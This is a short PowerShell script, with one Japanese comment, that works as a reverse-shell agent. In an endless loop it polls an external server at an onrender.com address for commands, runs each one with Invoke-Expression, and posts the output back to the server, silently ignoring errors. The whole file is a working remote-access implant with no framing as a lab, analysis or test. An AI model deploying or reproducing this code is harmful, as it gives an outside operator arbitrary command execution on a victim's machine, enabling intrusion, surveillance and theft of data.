$serverUrl = "https://reverse-g355.onrender.com"

function Poll-Command {
    try {
        $response = Invoke-RestMethod -Method POST -Uri "$serverUrl/api/poll" -Body '{}' -ContentType "application/json"
        return $response
    } catch {
        return $null
    }
}

function Report-Result($id, $result) {
    $body = @{ id = $id; result = $result } | ConvertTo-Json
    try {
        Invoke-RestMethod -Method POST -Uri "$serverUrl/api/report" -Body $body -ContentType "application/json" | Out-Null
    } catch {
        # 何もしない（エラー無視）
    }
}

function Execute-Command($command) {
    try {
        $output = Invoke-Expression $command 2>&1
        return $output
    } catch {
        return "Error"
    }
}

while ($true) {
    $cmdObj = Poll-Command
    if ($cmdObj -ne $null) {
        $result = Execute-Command $cmdObj.command
        Report-Result -id $cmdObj.id -result $result
    } else {
        Start-Sleep -Seconds 3
    }
}
